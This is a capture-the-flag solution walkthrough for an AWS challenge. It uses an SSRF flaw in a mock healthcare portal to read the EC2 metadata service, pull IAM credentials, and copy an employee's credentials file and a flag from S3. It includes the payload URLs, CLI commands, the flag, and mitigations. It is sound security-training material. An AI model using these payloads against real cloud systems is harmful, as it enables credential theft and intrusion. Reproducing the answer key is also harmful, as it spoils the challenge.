# Challenge 03 - AWS EC2 SSRF to S3 Access Solution

## Solution Walkthrough

### Step 1: Explore the Web Application

Access the provided URL to find the MediCloudX Health data analytics portal. The application includes:
- A connectivity checker tool for external services
- System status dashboard
- Professional healthcare-themed interface

### Step 2: Identify SSRF Vulnerability

The connectivity checker accepts any URL without validation, making it vulnerable to SSRF attacks.

### Step 3: Discover Bucket Names

First, use the SSRF vulnerability to discover the bucket names by accessing:

```
URL: http://169.254.169.254/latest/user-data
```

This will reveal the EC2 user-data script containing bucket configuration. Alternatively, check for configuration files:

```
URL: file:///opt/medicloudx/config.env
```

### Step 4: Access EC2 Metadata Service

Use the SSRF vulnerability to access the EC2 metadata service:

```
URL: http://169.254.169.254/latest/meta-data/
```

Explore the metadata to find:
- Instance identity
- IAM role information
- Security credentials

### Step 5: Extract Temporary Credentials

Access the security credentials endpoint:

```
URL: http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE-NAME]
```

This returns temporary AWS credentials (AccessKeyId, SecretAccessKey, Token).

### Step 6: Configure AWS CLI

Use the extracted credentials to configure AWS CLI or use them programmatically:

```bash
export AWS_ACCESS_KEY_ID="[ACCESS_KEY]"
export AWS_SECRET_ACCESS_KEY="[SECRET_KEY]"
export AWS_SESSION_TOKEN="[TOKEN]"
```

### Step 7: Access Credentials Bucket

Use the bucket name discovered in Step 3 to access the credentials bucket:

```bash
aws s3 ls s3://[CREDENTIALS_BUCKET_NAME]
aws s3 cp s3://[CREDENTIALS_BUCKET_NAME]/employees/daniel.lopez/aws-credentials.csv ./
```

### Step 8: Extract daniel.lopez Credentials

The CSV file contains daniel.lopez's permanent AWS credentials.

### Step 9: Access Flag Bucket

Configure AWS CLI with daniel.lopez credentials and access the flag bucket using the bucket name from Step 3:

```bash
aws s3 ls s3://[FLAG_BUCKET_NAME]
aws s3 cp s3://[FLAG_BUCKET_NAME]/analytics/patient-insights/flag.txt ./
```

## Flag

```
CLD[2f8e9d4a-7c1b-4e3a-9f2d-8b6c5e4d3a2f]
```

## Learning Objectives

- Understanding SSRF vulnerabilities and their exploitation
- AWS EC2 metadata service security implications
- IAM role and policy misconfigurations
- S3 bucket security and access patterns
- Real-world cloud security attack chains

## Mitigation Strategies

1. **Input Validation**: Implement strict URL validation and allowlisting
2. **Network Segmentation**: Block access to metadata service from application layer
3. **IMDSv2**: Use Instance Metadata Service v2 with session tokens
4. **Least Privilege**: Apply minimal IAM permissions to EC2 roles
5. **Monitoring**: Implement logging and monitoring for unusual S3 access patterns

## Troubleshooting

### Common Issues

1. **EC2 Instance Not Accessible**: Check security group rules and VPC configuration
2. **SSRF Not Working**: Verify the web application is properly deployed
3. **S3 Access Denied**: Confirm IAM policies and bucket permissions
4. **Metadata Service Timeout**: Ensure EC2 instance has proper IAM role attached

### Debug Commands

```bash
# Check EC2 instance status
aws ec2 describe-instances --instance-ids [INSTANCE_ID]

# Verify IAM role attachment
aws ec2 describe-instances --instance-ids [INSTANCE_ID] --query 'Reservations[].Instances[].IamInstanceProfile'

# Test S3 bucket access
aws s3 ls s3://[BUCKET_NAME] --region us-east-1
```
